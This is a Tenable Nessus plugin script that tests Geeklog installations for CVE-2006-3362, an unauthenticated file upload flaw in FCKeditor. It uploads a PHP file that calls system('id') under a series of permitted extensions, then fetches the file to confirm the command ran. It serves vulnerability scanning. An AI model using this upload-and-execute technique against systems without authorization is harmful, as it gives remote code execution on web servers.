#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21780);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_cve_id("CVE-2006-3362");
  script_bugtraq_id(18767);
  script_osvdb_id(26935);
  script_xref(name:"EDB-ID", value:"1964");

  script_name(english:"FCKeditor on Apache connector.php Crafted File Extension Arbitrary File Upload");
  script_summary(english:"Tries to upload a file with PHP code using Geeklog's FCKeditor");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Geeklog installed on the remote host includes an older
version of FCKeditor that is enabled by default and allows an
unauthenticated attacker to upload arbitrary files containing, say,
PHP code, and then to execute them subject to the privileges of the
web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/exploit-for-fckeditor-filemanager");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/geeklog-1.4.0sr4");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Geeklog 1.4.0sr4 or later or disable FCKeditor as discussed
in the first vendor advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/06/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:geeklog:geeklog");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/geeklog");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php");

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # If it does...
  if ("Invalid command." >< res)
  {
    # Try to upload a file that will execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php");

    exts = make_list(
      "zip",
      "doc",
      "xls",
      "pdf",
      "rtf",
      "csv",
      "jpg",
      "gif",
      "jpeg",
      "png",
      "avi",
      "mpg",
      "mpeg",
      "swf",
      "fla"
    );
    foreach ext (exts)
    {
      bound = "nessus";
      boundary = string("--", bound);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="NewFile"; filename="', fname, ".", ext, '"', "\r\n",
        "Content-Type:\r\n",
        "\r\n",
        '<?php system(', cmd, ");  ?>\r\n",

        boundary, "--", "\r\n"
      );
      req = string(
        req,
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      w = http_send_recv3(method:"POST", port: port,
        item: url+"?Command=FileUpload&Type=File",
	content_type: "multipart/form-data; boundary="+bound,
	data: postdata);
      if (isnull(w)) exit(1, "the web server did not answer");
      res = w[2];

      # If it looks like the upload was accepted...
      if ("OnUploadCompleted(0)" >< res)
      {
        # Try to execute the script.
        w = http_send_recv3(method:"GET",
          item:string(dir, "/images/library/File/", fname, ".", ext), 
          port:port
        );
	if (isnull(w)) exit(1, "the web server did not answer");
	res = w[2];
    
        # There's a problem if...
        if (
          # the output looks like it's from id or...
          egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
          # PHP's disable_functions prevents running system().
          egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
        )
        {
          res = strstr(res, "uid=");
          if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
          {
            report = string(
              "\n",
              "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
              "which produced the following output :\n",
              "\n",
              res
            );
            security_warning(port:port, extra:report);
          }
          else security_warning(port);

          exit(0);
        }
      }
    }
  }
}
